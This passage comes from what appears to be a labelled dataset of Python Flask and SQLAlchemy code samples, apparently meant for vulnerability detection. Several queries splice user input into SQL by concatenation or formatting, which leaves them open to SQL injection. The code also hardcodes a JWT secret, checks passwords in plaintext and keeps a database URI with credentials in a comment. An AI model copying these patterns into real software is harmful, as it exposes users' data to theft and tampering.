   con, queryset_list = psycopg2.connect(**self.config), None\n        cur = con.cursor(cursor_factory=RealDictCursor)\n        try:\n            if not self.q:\n                cur.execute(\n                    \" SELECT *,( SELECT count(*) FROM \"\n                    \"answers WHERE answers.question_id=questions.question_id ) as \"\n                    \"answers_count FROM questions \"\n                    \" ORDER BY questions.created_at DESC\"\n                )\n            else:\n                query = \"SELECT *, ( SELECT count(*) FROM answers WHERE \"\n                query += \" answers.question_id=questions.question_id ) as answers_count \"\n                query += \" FROM questions WHERE  body LIKE %s OR title LIKE %s  \"\n                query += \" ORDER BY questions.created_at\"\n                cur.execute(query, (self.q, self.q))\n            queryset_list = cur.fetchall()\n        except Exception as e:\n            print(e)\n        con.close()\n        return queryset_list\n\n    def filter_by(self):\n        \"\"\"\n        Selects a question by id\n        :return: False if record is not found else query list of found record\n        \"\"\"\n        con, queryset_list = psycopg2.connect(**self.config), None\n        cur = con.cursor(cursor_factory=RealDictCursor)\n        cur2 = con.cursor(cursor_factory=RealDictCursor)\n        try:\n\n            query = \"\"\" SELECT * FROM questions WHERE questions.question_id=%s ORDER BY questions.created_at\"\"\"\n            cur.execute(query % self.question_id)\n            questions_queryset_list = cur.fetchall()\n            cur2.execute(\"SELECT * FROM answers WHERE answers.question_id=%s\" % self.question_id)\n            answers_queryset_list = cur2.fetchall()\n            queryset_list = {\n                'question': questions_queryset_list,\n                'answers': answers_queryset_list\n            }\n        except Exception as e:\n            print(e)\n        con.close()\n        return queryset_list\n\n    def filter_by_user(self):\n        \"\"\"\n        Selects question for specific user:default filters by current logged in user\n        :return: False if record is not found else query list of found record\n        \"\"\"\n        con, queryset_list = psycopg2.connect(**self.config), None\n        cur = con.cursor(cursor_factory=RealDictCursor)\n        try:\n            cur.execute(\n                \"\"\" SELECT * FROM questions \n                    WHERE questions.user_id=\"\"\" + self.user_id + \"\"\" ORDER BY questions.created_at \"\"\"\n            )\n            questions_queryset_list = cur.fetchall()\n            queryset_list = {'question': questions_queryset_list}\n        except Exception as e:\n            print(e)\n        con.close()\n        return queryset_list\n\n    def update(self):\n        \"\"\"\n        Update an question column\n        :return: bool:\n        \"\"\"\n        con, result = psycopg2.connect(**self.config), True\n        cur = con.cursor(cursor_factory=RealDictCursor)\n        try:\n            query = \"UPDATE questions SET title=%s, body=%s WHERE question_id=%s\"\n            cur.execute(query, (self.title, self.body, self.question_id))\n            con.commit()\n        except Exception as e:\n            print(e)\n            result = False\n        con.close()\n        return result\n\n    def record_exists(self):\n        \"\"\"\n        checks whether a question was asked by the user\n        :return: bool: False if record is not found else True\n        \"\"\"\n        con, exists = psycopg2.connect(**self.config), False\n        cur, queryset_list = con.cursor(cursor_factory=RealDictCursor), None\n        try:\n            query = \"SELECT question_id, user_id FROM questions WHERE question_id=%s AND user_id=%s\"\n            cur.execute(query, (self.question_id, self.user_id))\n            queryset_list = cur.fetchall()\n            con.close()\n            exists = True if len(queryset_list) > 1 else False\n        except Exception as e:\n            print(e)\n        return exists\n\n    def delete(self):\n        \"\"\" Delete a table records\n        :return: bool\n        \"\"\"\n        con = psycopg2.connect(**self.config)\n        cur = con.cursor(cursor_factory=RealDictCursor)\n        try:\n            exist = self.filter_by()['question']\n            if not len(exist) > 0:\n                return 404\n            if not self.record_exists():\n                return 401\n            cur.execute(\"DELETE from {} WHERE {}= '{}'\".format(self.table, 'question_id', self.question_id))\n            con.commit()\n        except Exception as e:\n            print(e)\n            con.close()\n            return False\n        con.close()\n        return True\n/n/n/napp/questions/test/test_question_model.py/n/n# APIs Testing\n\n# Author: P8ul\n# https://github.com/p8ul\n\nimport unittest\nfrom ...test.base import BaseTestCase\nfrom ..models import Table\n\ntable = Table()\n\n\nclass FlaskTestCase(BaseTestCase):\n\n    \"\"\" Test question model  \"\"\"\n    def test_question_model(self):\n        query = table.query()\n        self.assertIsInstance(query, type([]))\n\n    def test_model_filter(self):\n        query = table.filter_by()\n        self.assertEqual(query, None)\n\n    def test_model_filter_user(self):\n        query = table.filter_by_user()\n        self.assertEqual(query, None)\n\n    def test_model_save(self):\n        query = table.save()\n        self.assertEqual(query, None)\n\n    def test_model_update(self):\n        query = table.update()\n        self.assertEqual(query, True)\n\n    def test_model_delete(self):\n        query = table.delete()\n        self.assertEqual(query, False)\n\n    def test_model_init(self):\n        keys = table.config.keys()\n        self.assertIn(list(keys)[0], ['password', 'user', 'database', 'host'])\n        self.assertEqual(len(list(keys)), 4)\n\n\nif __name__ == '__main__':\n    unittest.main()\n/n/n/napp/questions/test/test_questions_apis.py/n/n# APIs Testing\n\n# Author: P8ul\n# https://github.com/p8ul\n\nimport unittest\nfrom ...test.base import BaseTestCase\n\n\nclass FlaskTestCase(BaseTestCase):\n\n    \"\"\" Test List questions api \"\"\"\n    def test_list_questions(self):\n        response = self.client.get(\n            '/api/v1/questions/',\n            headers={'Authorization': 'JWT ' + self.token}\n        )\n        assert response.status_code == 200\n        assert response.get_json()['status'] == 'success'\n\n    \"\"\" Test retrieve questions api \"\"\"\n    def test_retrieve_question(self):\n        response = self.client.get(\n            '/api/v1/questions/1',\n            headers={'Authorization': 'JWT ' + self.token}\n        )\n        self.assertEqual(response.status_code, 200)\n        self.assertEqual(response.get_json()['status'], 'success')\n\n    \"\"\" Test retrieve questions api \"\"\"\n    def test_post_update(self):\n        \"\"\" Initialize test data \"\"\"\n        data = {\n            'title': 'Test title',\n            'body': 'Test body',\n            'user': self.user_id\n        }\n\n        \"\"\" Post request\"\"\"\n        response = self.client.post(\n            '/api/v1/questions/', json=data,\n            headers={'Authorization': 'JWT ' + self.token}\n        )\n\n        \"\"\" Test status \"\"\"\n        self.assertEqual(response.status_code, 201)\n\n        \"\"\" Test if a question is created \"\"\"\n        self.assertEqual(response.get_json()['status'], 'success')\n\n\nif __name__ == '__main__':\n    unittest.main()\n/n/n/napp/test/base.py/n/nimport unittest\n\nfrom .. import create_app\napp = create_app(\"config.TestConfig\")\n\n\nclass BaseTestCase(unittest.TestCase):\n    \"\"\"A base test case.\"\"\"\n\n    def create_app(self):\n        app.config.from_object('config.TestConfig')\n        return app\n\n    def setUp(self):\n        # method to invoke before each test.\n        self.client = app.test_client()\n        self.data = {\n            'username': 'Paul',\n            'email': 'pkinuthia10@gmail.com',\n            'password': 'password'\n        }\n        \"\"\" Login to get a JWT token \"\"\"\n        self.client.post('/api/v1/auth/signup', json=self.data)\n        response = self.client.post('/api/v1/auth/login', json=self.data)\n        self.token = response.get_json().get('auth_token')\n        self.user_id = str(response.get_json()['id'])\n\n    def tearDown(self):\n        # method to invoke after each test.\n        pass\n/n/n/napp/utils.py/n/nfrom urllib.parse import urlparse\nimport datetime\nimport os\nimport re\nfrom functools import wraps\nfrom flask import request, make_response, jsonify, session\nimport jwt\n\n\ndef jwt_required(f):\n    \"\"\" Ensure jwt token is provided and valid\n        :param f: function to decorated\n        :return: decorated function\n    \"\"\"\n    @wraps(f)\n    def decorated_function(*args, **kwargs):\n        try:\n            auth_header = request.headers.get('Authorization').split(' ')[-1]\n        except Exception as e:\n            print(e)\n            return make_response(jsonify({\"message\": 'Unauthorized. Please login'})), 401\n        result = decode_auth_token(auth_header)\n        try:\n            if int(result):\n                pass\n        except Exception as e:\n            print(e)\n            return make_response(jsonify({\"message\": result})), 401\n        return f(*args, **kwargs)\n    return decorated_function\n\n\ndef encode_auth_token(user_id):\n    \"\"\"\n    Encodes a payload to generate JWT Token\n    :param user_id: Logged in user Id\n    :return: JWT token\n    :TODO add secret key to app configuration\n    \"\"\"\n    payload = {\n        'exp': datetime.datetime.utcnow() + datetime.timedelta(days=31, seconds=30),\n        'iat': datetime.datetime.utcnow(),\n        'sub': user_id\n    }\n    return jwt.encode(\n        payload,\n        'SECRET_KEY',\n        algorithm='HS256'\n    )\n\n\ndef decode_auth_token(auth_token):\n    \"\"\" Validates the auth token\n    :param auth_token:\n    :return: integer|string\n    \"\"\"\n    try:\n        payload = jwt.decode(auth_token, 'SECRET_KEY', algorithm='HS256')\n        session['user_id'] = str(payload.get('sub'))\n        return payload['sub']\n    except jwt.ExpiredSignatureError:\n        return 'Token Signature expired. Please log in again.'\n    except jwt.InvalidTokenError:\n        return 'Invalid token. Please log in again.'\n\n\ndef db_config(database_uri):\n    \"\"\" This function extracts postgres url\n    and return database login information\n    :param database_uri: database Configuration uri\n    :return: database login information\n    \"\"\"\n    if os.environ.get('DATABASE_URI'):\n        database_uri = os.environ.get('DATABASE_URI')\n\n    result = urlparse(database_uri)\n    config = {\n        'database': result.path[1:],\n        'user': result.username,\n        'password': result.password,\n        'host': result.hostname\n    }\n    return config\n\n\ndef valid_email(email):\n    \"\"\"  Validate email \"\"\"\n    return re.match(r'^.+@([?)[a-zA-Z0-9-.])+.([a-zA-Z]{2,3}|[0-9]{1,3})(]?)$', email)\n/n/n/napp/votes/api/v1/view.py/n/nfrom flask import Blueprint, request, make_response, jsonify, session\nfrom flask.views import MethodView\nfrom ...models import Table\nfrom ....utils import jwt_required\n\nvotes_blueprint = Blueprint('votes', __name__)\n\n\nclass VoteAPIView(MethodView):\n    \"\"\" Update Instance api resource \"\"\"\n\n    @jwt_required\n    def post(self, answer_id=None):\n        data = request.get_json(force=True)\n        data['answer_id'] = answer_id\n        data['user_id'] = session.get('user_id')\n        response = Table(data).vote()\n        if response:\n            response_object = {\n                'status': 'success',\n                'message': 'Your vote was successful'\n            }\n            return make_response(jsonify(response_object)), 201\n\n        response_object = {\n            'status': 'fail',\n            'message': 'Some error occurred. Please try again.'\n        }\n        return make_response(jsonify(response_object)), 400\n\n\n# Define the API resources\nvote_view = VoteAPIView.as_view('vote_api')\n\n# Add Rules for API Endpoints\nvotes_blueprint.add_url_rule(\n    '/api/v1/questions/answers/vote/<string:answer_id>',\n    view_func=vote_view,\n    methods=['POST']\n)\n/n/n/napp/votes/models.py/n/n\"\"\"\n    Author: P8ul\n    https://github.com/p8ul\n\n    This class will connect to a Database and perform crud actions\n    Has relevant getters, setters & mutation methods\n\"\"\"\nimport psycopg2\nimport psycopg2.extensions\nfrom psycopg2.extras import RealDictCursor\nfrom config import BaseConfig\nfrom ..utils import db_config\n\n\nclass Table:\n    def __init__(self, data={}):\n        self.config = db_config(BaseConfig.DATABASE_URI)\n        self.table, self.answer_id = 'votes', data.get('answer_id')\n        self.vote_value, self.user_id = data.get('vote'), data.get('user_id')\n\n    def vote_exists(self):\n        \"\"\"\n        Checks if vote for a particular answer\n        is voted by current user\n        :return: True if vote exist else False\n        \"\"\"\n        con = psycopg2.connect(**self.config)\n        cur = con.cursor(cursor_factory=RealDictCursor)\n        try:\n            query = \"SELECT user_id, vote_id FROM votes WHERE answer_id=%s AND user_id=%s\"\n            cur.execute(query, (self.answer_id, self.user_id))\n            queryset_list = cur.fetchall()\n            con.close()\n            if len(queryset_list) < 1:\n                return False\n            return True\n        except Exception as e:\n            print(e)\n            con.close()\n            return False\n\n    def create_vote(self):\n        \"\"\"\n        Insert a vote in votes table\n        :return: True if record values are inserted successfully else false\n        \"\"\"\n        con = psycopg2.connect(**self.config)\n        cur = con.cursor(cursor_factory=RealDictCursor)\n        try:\n            query = \"INSERT INTO votes(user_id, answer_id, vote) VALUES(%s, %s, %s)\"\n            cur.execute(query, (self.user_id, self.answer_id, self.vote_value))\n            con.commit()\n        except Exception as e:\n            print(e)\n            con.close()\n            return False\n        return True\n\n    def update_vote(self):\n        \"\"\"\n        Modify record from votes table\n        :return:\n        \"\"\"\n        if not self.answer_id:\n            return False\n        try:\n            con = psycopg2.connect(**self.config)\n            cur = con.cursor(cursor_factory=RealDictCursor)\n            query = \"UPDATE votes SET vote=%s WHERE answer_id=%s AND user_id=%s\"\n            cur.execute(query, (self.vote_value, self.answer_id, self.user_id))\n            con.commit()\n        except Exception as e:\n            print(e)\n            con.close()\n            return False\n        return True\n\n    def vote(self):\n        \"\"\"\n        Switch bus for updating or creating a vote\n        :return: bool: True if transaction is\n                       completed successfully else false\n        \"\"\"\n        if self.vote_exists():\n            return self.update_vote()\n        return self.create_vote()\n\n    def delete(self):\n        pass\n\n    def save(self):\n        pass\n/n/n/napp/votes/test/__init__.py/n/n/n/n/napp/votes/test/test_vote_apis.py/n/n# APIs Testing\n\n# Author: P8ul\n# https://github.com/p8ul\n\nimport unittest\nfrom ...test.base import BaseTestCase\n\n\nclass FlaskTestCase(BaseTestCase):\n\n    \"\"\" Test List votes api \"\"\"\n    def test_votes_api(self):\n        response = self.client.post(\n            '/api/v1/questions/answers/vote/1', data=self.data,\n            headers={'Authorization': 'JWT ' + self.token}\n        )\n        assert response.status_code == 400\n\n\nif __name__ == '__main__':\n    unittest.main()\n/n/n/napp/votes/test/test_vote_model.py/n/n# APIs Testing\n\n# Author: P8ul\n# https://github.com/p8ul\n\nimport unittest\nfrom ...test.base import BaseTestCase\nfrom ..models import Table\n\ntable = Table()\n\nclass FlaskTestCase(BaseTestCase):\n\n    \"\"\" Test votes model  \"\"\"\n    def test_model_save(self):\n        query = table.save()\n        self.assertEqual(query, None)\n\n    def test_model_delete(self):\n        query = table.delete()\n        self.assertEqual(query, None)\n\n    def test_model_vote_exist(self):\n        query = table.vote_exists()\n        self.assertEqual(query, None)\n\n    def test_model_vote_exist(self):\n        query = table.vote()\n        self.assertEqual(query, False)\n\n    def test_model_update_vote(self):\n        query = table.update_vote()\n        self.assertEqual(query, False)\n\n    def test_model_create_vote(self):\n        query = table.create_vote()\n        self.assertEqual(query, False)\n\n    def test_model_init(self):\n        keys = table.config.keys()\n        self.assertIn(list(keys)[0], ['password', 'user', 'database', 'host'])\n        self.assertEqual(len(list(keys)), 4)\n\n\nif __name__ == '__main__':\n    unittest.main()\n/n/n/nconfig.py/n/n### Configuration file\n\n# Author: P8ul Kinuthia\n# https://github.com/p8ul\n\nimport os\n\n\n# default config\nclass BaseConfig(object):\n    basedir = os.path.abspath(os.path.dirname(__file__))\n    # DATABASE_URI = \"postgres://tvhuxucdtigrin:fc7e1f53efe5f81b6a6d3dacad8f79605cd0973d0ae5efa5ac29b3976b48f938@ec2-54-83-13-119.compute-1.amazonaws.com:5432/d393cevo034f77\"\n    DATABASE_URI = \"postgresql://stack:stack@127.0.0.1:5432/stack\"\n    DEBUG = True\n    SECRET_KEY = '\\xbf\\xb0\\x11\\xb1\\xcd\\xf9\\xba\\x8bp\\x0c...'\n\n\nclass TestConfig(BaseConfig):\n    DEBUG = True\n    TESTING = True\n    WTF_CSRF_ENABLED = False\n    DATABASE_URI = 'sqlite:///:memory:'\n\n\nclass DevelopmentConfig(BaseConfig):\n    DEBUG = True\n\n\nclass ProductionConfig(BaseConfig):\n    DEBUG = True/n/n/nmanage.py/n/n# Flask app\n\n# Author: P8ul\n# https://github.com/p8ul\n\nfrom app import create_app\napp = create_app(\"config.BaseConfig\")\n\nif __name__ == \"__main__\":\n    app.run(debug=True)\n/n/n/n", "label": 0}, {"id": "ad02c932f85c0f4ed6c1e561efc5edc163347806", "code": "/app/__init__.py/n/n# Flask create app\n\n# Author: P8ul\n# https://github.com/p8ul\n\nfrom flask import Flask\nfrom .migrations.db import db\n\n\ndef create_app(config_filename):\n    app = Flask(__name__)\n    app.config.from_object(config_filename)\n\n    with app.app_context():\n        pass\n\n    \"\"\" Basic Routes \"\"\"\n\n    # register our blueprints\n    configure_blueprints(app)\n\n    # register extensions\n    configure_extensions()\n\n    return app\n\n\ndef configure_blueprints(app):\n    \"\"\"Configure blueprints .\"\"\"\n    from app.questions.api.v1.view import question_blueprint\n    from .home.views import home_blueprint\n    from .auth.api.v1.view import auth_blueprint\n    from .answers.api.v1.view import answers_blueprint\n    from .votes.api.v1.view import votes_blueprint\n    from .comments.api.v1.view import comments_blueprint\n\n    app_blueprints = [\n        answers_blueprint,\n        question_blueprint,\n        auth_blueprint,\n        votes_blueprint,\n        comments_blueprint,\n        home_blueprint\n    ]\n\n    for bp in app_blueprints:\n        app.register_blueprint(bp)\n\n\ndef configure_extensions():\n    db.test()\n\n\nif __name__ == \"__main__\":\n    app = create_app(\"config\")\n    app.run(debug=True)\n/n/n/n/app/answers/api/v1/view.py/n/n# APIs Resources\n\n# Author: P8ul\n# https://github.com/p8ul\n\nfrom flask import Blueprint, request, make_response, jsonify\nfrom flask.views import MethodView\nfrom ...models import Table\nfrom ....utils import jwt_required\n\nanswers_blueprint = Blueprint('answers', __name__)\n\n\nclass CreateAPIView(MethodView):\n    \"\"\" Update Instance api resource \"\"\"\n\n    @jwt_required\n    def put(self, question_id=None, answer_id=None):\n        data = request.get_json(force=True)\n        response = Table.update(question_id, answer_id, data)\n        if response == 200:\n            response_object = {\n                'status': 'success',\n                'message': 'Update successful'\n            }\n            return make_response(jsonify(response_object)), 200\n        if response == 302:\n            response_object = {\n                'status': 'fail',\n                'message': 'Please provide correct answer and question id'\n            }\n            return make_response(jsonify(response_object)), 400\n        if response == 203:\n            response_object = {\n                'status': 'fail',\n                'message': 'Unauthorized request.'\n            }\n            return make_response(jsonify(response_object)), 401\n\n        else:\n            response_object = {\n                'status': 'fail',\n                'message': 'Please provide correct answer and question id'\n            }\n            return make_response(jsonify(response_object)), 400\n\n\n    \"\"\"\n    Create API Resource\n    \"\"\"\n    @jwt_required\n    def post(self, question_id=None):\n        # get the post data\n        post_data = request.get_json(force=True)\n        response = Table.save(str(question_id), data=post_data)\n        if response:\n            response_object = {\n                'status': 'success',\n                'message': response\n            }\n            return make_response(jsonify(response_object)), 201\n\n        response_object = {\n            'status': 'fail',\n            'message': 'Unknown question id. Try a different id.'\n        }\n        return make_response(jsonify(response_object)), 400\n\n\nclass ListAPIView(MethodView):\n    \"\"\"\n    List API Resource\n    \"\"\"\n    @jwt_required\n    def get(self, instance_id=None, user_id=None):\n        if instance_id:\n            query = {\n                'instance_id': instance_id,\n                'user_id': user_id\n            }\n            results = Table.filter_by(**query)\n            if len(results) < 1:\n                response_object = {\n                    'results': 'Instance not found',\n                    'status': 'error'\n                }\n                return make_response(jsonify(response_object)), 404\n            response_object = {\n                'results': results,\n                'status': 'success'\n            }\n            return (jsonify(response_object)), 200\n\n        response_object = {\n            'results': Table.query(),\n            'status': 'success'\n        }\n        return (jsonify(response_object)), 200\n\n\n# Define the API resources\ncreate_view = CreateAPIView.as_view('create_api')\nlist_view = ListAPIView.as_view('list_api')\n\n# Add Rules for API Endpoints\nanswers_blueprint.add_url_rule(\n    '/api/v1/questions/<int:question_id>/answers',\n    view_func=create_view,\n    methods=['POST']\n)\n\nanswers_blueprint.add_url_rule(\n    '/api/v1/questions/<string:question_id>/answers/<string:answer_id>',\n    view_func=create_view,\n    methods=['PUT']\n)\n\nanswers_blueprint.add_url_rule(\n    '/api/v1/questions/answers',\n    view_func=list_view,\n    methods=['GET']\n)\n/n/n/n/app/answers/test/base.py/n/nimport unittest\n\nfrom ... import create_app\napp = create_app(\"config.TestConfig\")\n\n\nclass BaseTestCase(unittest.TestCase):\n    \"\"\"A base test case.\"\"\"\n    def create_app(self):\n        app.config.from_object('config.TestConfig')\n        return app\n\n    def setUp(self):\n        # method to invoke before each test.\n        self.client = app.test_client()\n        self.data = {\n            'username': 'Paul',\n            'email': 'pkinuthia10@gmail.com',\n            'password': 'password'\n        }\n        \"\"\" Login to get a JWT token \"\"\"\n        self.client.post('/api/v1/auth/signup', json=self.data)\n        response = self.client.post('/api/v1/auth/login', json=self.data)\n        self.token = response.get_json().get('auth_token')\n        self.user_id = str(response.get_json()['id'])\n\n    def tearDown(self):\n        # method to invoke after each test.\n        pass\n/n/n/n/app/answers/test/test_basics.py/n/n# APIs Testing\n\n# Author: P8ul Kinuthia\n# https://github.com/p8ul\n\nimport unittest\nfrom .base import BaseTestCase\n\n\nclass FlaskTestCase(BaseTestCase):\n\n    \"\"\" Test List answers api \"\"\"\n    def test_list_answers(self):\n        response = self.client.get(\n            '/api/v1/questions/answers',\n            headers={'Authorization': 'JWT ' + self.token}\n        )\n        self.assertEqual(response.status_code, 200)\n        self.assertEqual(response.get_json()['status'], 'success')\n\n    \"\"\" Test answers CRUD api \"\"\"\n    def test_post_update(self):\n        \"\"\" Initialize test data \"\"\"\n        data = {\n            'title': 'Test title',\n            'body': 'Test body',\n            'answer_body': 'Test answer',\n            'user': self.user_id\n        }\n\n        \"\"\" Add test question\"\"\"\n        self.client.post(\n            '/api/v1/questions/', json=data,\n            headers={'Authorization': 'JWT ' + self.token}\n        )\n\n        response = self.client.get(\n            '/api/v1/questions/',\n            headers={'Authorization': 'JWT ' + self.token}\n        )\n        question_id = response.get_json().get('results')[0].get('question_id')\n\n        \"\"\" Test post answer \"\"\"\n        response = self.client.post(\n            '/api/v1/questions/'+str(question_id)+'/answers', json=data,\n            headers={'Authorization': 'JWT ' + self.token}\n        )\n\n        \"\"\" Test status \"\"\"\n        self.assertEqual(response.status_code, 201)\n\n        \"\"\" Test if a question is created \"\"\"\n        self.assertEqual(response.get_json()['status'], 'success')\n\n\nif __name__ == '__main__':\n    unittest.main()\n/n/n/n/app/auth/api/v1/view.py/n/nfrom flask import Blueprint, request, make_response, jsonify\nfrom flask.views import MethodView\nfrom ...models import Table\nfrom ....utils import jwt_required, encode_auth_token\n\nauth_blueprint = Blueprint('auth', __name__)\n\n\nclass RegisterAPI(MethodView):\n    \"\"\"\n    User Signup API Resource\n    \"\"\"\n\n    def post(self):\n        # get the post data\n        post_data = request.get_json(force=True)\n        # check if user already exists\n        user = Table.filter_by(post_data.get('email'))\n        if not user:\n            try:\n                user = Table.save(data=post_data)\n                # generate the auth token\n                auth_token = encode_auth_token(user.get('id')).decode()\n                response_object = {\n                    'status': 'success',\n                    'message': 'Successfully registered.',\n                    'id': user.get('id'),\n                    'auth_token': auth_token\n                }\n                return make_response(jsonify(response_object)), 201\n            except Exception as e:\n                print(e)\n                response_object = {\n                    'status': 'fail',\n                    'message': 'Some error occurred. Please try again.'\n                }\n                return make_response(jsonify(response_object)), 401\n        else:\n            response_object = {\n                'status': 'fail',\n                'message': 'User already exists. Please Log in.',\n            }\n            return make_response(jsonify(response_object)), 202\n\n    def delete(self, user_id=None):\n        post_data = request.get_json(force=True)\n        Table.delete(user_id, post_data)\n        response_object = {\n            'status': 'success',\n            'message': 'User deleted successfully.',\n        }\n        return make_response(jsonify(response_object)), 200\n\n\nclass LoginAPI(MethodView):\n    \"\"\" User Login API Resource \"\"\"\n    def post(self):\n        # get the post data\n        post_data = request.get_json(force=True)\n        try:\n            # fetch the user data\n            user = Table.filter_by(email=post_data.get('email'))\n            if len(user) >= 1 and post_data.get('password'):\n                if str(user[0][3]) == str(post_data.get('password')):\n                    auth_token = encode_auth_token(user[0][0])\n                else:\n                    response_object = {\n                        'status': 'fail',\n                        'message': 'Password or email do not match.'\n                    }\n                    return make_response(jsonify(response_object)), 401\n                try:\n                    if auth_token:\n                        response_object = {\n                            'status': 'success',\n                            'id': user[0][0],\n                            'message': 'Successfully logged in.',\n                            'auth_token': auth_token.decode()\n                        }\n                        return make_response(jsonify(response_object)), 200\n                except Exception as e:\n                    print(e)\n                    return {\"message\": 'Error decoding token'}, 401\n            else:\n                response_object = {\n                    'status': 'fail',\n                    'message': 'User does not exist.'\n                }\n                return make_response(jsonify(response_object)), 404\n        except Exception as e:\n            print(e)\n            response_object = {\n                'status': 'fail',\n                'message': 'Try again'\n            }\n            return make_response(jsonify(response_object)), 500\n\n\nclass UserListAPI(MethodView):\n    \"\"\" User List Api Resource \"\"\"\n    @jwt_required\n    def get(self, user_id=None):\n        if user_id:\n            user = Table.filter_by(email=None, user_id=user_id)\n            if len(user) < 1:\n                response_object = {\n                    'results': 'User not found',\n                    'status': 'fail'\n                }\n                return make_response(jsonify(response_object)), 404\n            response_object = {\n                'results': user,\n                'status': 'success'\n            }\n            return (jsonify(response_object)), 200\n\n        response_object = {\n            'results': Table.query(),\n            'status': 'success'\n        }\n        return (jsonify(response_object)), 200\n\n\nclass LogoutAPI(MethodView):\n    \"\"\" Logout Resource \"\"\"\n    def post(self):\n        # get auth token\n        auth_header = request.headers.get('Authorization')\n        return auth_header\n\n\n# Define the API resources\nregistration_view = RegisterAPI.as_view('register_api')\nlogin_view = LoginAPI.as_view('login_api')\nuser_view = UserListAPI.as_view('user_api')\nlogout_view = LogoutAPI.as_view('logout_api')\n\n# Add Rules for API Endpoints\nauth_blueprint.add_url_rule(\n    '/api/v1/auth/signup',\n    view_func=registration_view,\n    methods=['POST']\n)\n\n# Add Rules for API Endpoints\nauth_blueprint.add_url_rule(\n    '/api/v1/auth/delete',\n    view_func=registration_view,\n    methods=['DELETE']\n)\nauth_blueprint.add_url_rule(\n    '/api/v1/auth/login',\n    view_func=login_view,\n    methods=['POST']\n)\nauth_blueprint.add_url_rule(\n    '/api/v1/auth/users',\n    view_func=user_view,\n    methods=['GET']\n)\nauth_blueprint.add_url_rule(\n    '/api/v1/auth/users/<string:user_id>',\n    view_func=user_view,\n    methods=['GET']\n)\nauth_blueprint.add_url_rule(\n    '/api/v1/auth/logout',\n    view_func=logout_view,\n    methods=['POST']\n)\n/n/n/n/app/auth/test/test_model.py/n/nfrom .base import BaseTestCase\nfrom ..models import Table\n\n\nclass FlaskTestCase(BaseTestCase):\n\n    \"\"\" Test signup api \"\"\"\n    def test_model_crud(self):\n        # Test Create\n        instance = Table.save(self.data)\n        assert instance == self.data\n\n        # Test query\n        isinstance(Table.query(), type([]))\n/n/n/n/app/comments/api/v1/view.py/n/nfrom flask import Blueprint, request, make_response, jsonify\nfrom flask.views import MethodView\nfrom ...models import Table\nfrom ....utils import jwt_required\n\ncomments_blueprint = Blueprint('comments', __name__)\n\n\nclass ListAPIView(MethodView):\n    \"\"\" Update Instance api resource \"\"\"\n\n    @jwt_required\n    def post(self, answer_id=None):\n        post_data = request.get_json(force=True)\n        response = Table.save(answer_id, data=post_data)\n        if response:\n            response_object = {\n                'status': 'success',\n                'message': 'Your comment was successful'\n            }\n            return make_response(jsonify(response_object)), 201\n\n        response_object = {\n            'status': 'fail',\n            'message': 'Some error occurred. Please try again.'\n        }\n        return make_response(jsonify(response_object)), 400\n\n\n# Define the API resources\ncomment_view = ListAPIView.as_view('comment_api')\n\n# Add Rules for API Endpoints\ncomments_blueprint.add_url_rule(\n    '/api/v1/questions/answers/comment/<string:answer_id>',\n    view_func=comment_view,\n    methods=['POST']\n)\n/n/n/n/app/migrations/db.py/n/nimport psycopg2\nimport psycopg2.extras\n\nfrom .initial1 import migrations\nfrom config import BaseConfig\nfrom ..utils import db_config\n\n\nclass Database:\n    def __init__(self, config):\n        self.config = db_config(config)\n        self.database = self.config.get('database')\n\n    def test(self):\n        con = psycopg2.connect(**self.config)\n        con.autocommit = True\n\n        cur = con.cursor(cursor_factory=psycopg2.extras.DictCursor)\n        cur.execute(\"select * from pg_database where datname = %(database_name)s\", {'database_name': self.database})\n        databases = cur.fetchall()\n        if len(databases) > 0:\n            print(\" * Database {} exists\".format(self.database))\n            for command in migrations:\n                try:\n                    cur.execute(command)\n                    con.commit()\n                except Exception as e:\n                    print(e)\n        else:\n            print(\" * Database {} does not exists\".format(self.database))\n        con.close()\n\n\ndb = Database(BaseConfig.SQLALCHEMY_DATABASE_URI)\n/n/n/n", "label": 1}, {"id": "4cde28ea869c921be917cd8726edb958b37d683a", "code": "search.py/n/nfrom sqlalchemy import sql\n\nfrom app import db\nfrom pub import Pub\n\n\ndef fulltext_search_title(query):\n    query_statement = sql.text(\"\"\"\n      SELECT id, ts_headline('english', title, query), ts_rank_cd(to_tsvector('english', title), query, 32) AS rank\n        FROM pub_2018, plainto_tsquery('english', :search_str) query  -- or try plainto_tsquery, phraseto_tsquery, to_tsquery\n        WHERE to_tsvector('english', title) @@ query\n        ORDER BY rank DESC\n        LIMIT 50;\"\"\")\n\n    rows = db.engine.execute(query_statement.bindparams(search_str=query)).fetchall()\n    ids = [row[0] for row in rows]\n    my_pubs = db.session.query(Pub).filter(Pub.id.in_(ids)).all()\n    for row in rows:\n        my_id = row[0]\n        for my_pub in my_pubs:\n            if my_id == my_pub.id:\n                my_pub.snippet = row[1]\n                my_pub.score = row[2]\n    return my_pubs\n\n\ndef autocomplete_phrases(query):\n    query_statement = sql.text(ur\"\"\"\n        with s as (SELECT id, lower(title) as lower_title FROM pub_2018 WHERE title iLIKE :p0)\n        select match, count(*) as score from (\n            SELECT regexp_matches(lower_title, :p1, 'g') as match FROM s\n            union all\n            SELECT regexp_matches(lower_title, :p2, 'g') as match FROM s\n            union all\n            SELECT regexp_matches(lower_title, :p3, 'g') as match FROM s\n            union all\n            SELECT regexp_matches(lower_title, :p4, 'g') as match FROM s\n        ) s_all\n        group by match\n        order by score desc, length(match::text) asc\n        LIMIT 50;\"\"\").bindparams(\n            p0='%{}%'.format(query),\n            p1=ur'({}\\w*?\\M)'.format(query),\n            p2=ur'({}\\w*?(?:\\s+\\w+){{1}})\\M'.format(query),\n            p3=ur'({}\\w*?(?:\\s+\\w+){{2}})\\M'.format(query),\n            p4=ur'({}\\w*?(?:\\s+\\w+){{3}}|)\\M'.format(query)\n        )\n\n    rows = db.engine.execute(query_statement).fetchall()\n    phrases = [{\"phrase\":row[0][0], \"score\":row[1]} for row in rows if row[0][0]]\n    return phrases/n/n/n", "label": 0}, {"id": "4cde28ea869c921be917cd8726edb958b37d683a", "code": "/search.py/n/nfrom sqlalchemy import sql\n\nfrom app import db\nfrom pub import Pub\n\ndef fulltext_search_title(query):\n    query_string = \"\"\"\n      SELECT id, ts_headline('english', title, query), ts_rank_cd(to_tsvector('english', title), query, 32) AS rank\n        FROM pub_2018, plainto_tsquery('english', '{}') query  -- or try plainto_tsquery, phraseto_tsquery, to_tsquery\n        WHERE to_tsvector('english', title) @@ query\n        ORDER BY rank DESC\n        LIMIT 50;\"\"\".format(query)\n\n    rows = db.engine.execute(sql.text(query_string)).fetchall()\n    ids = [row[0] for row in rows]\n    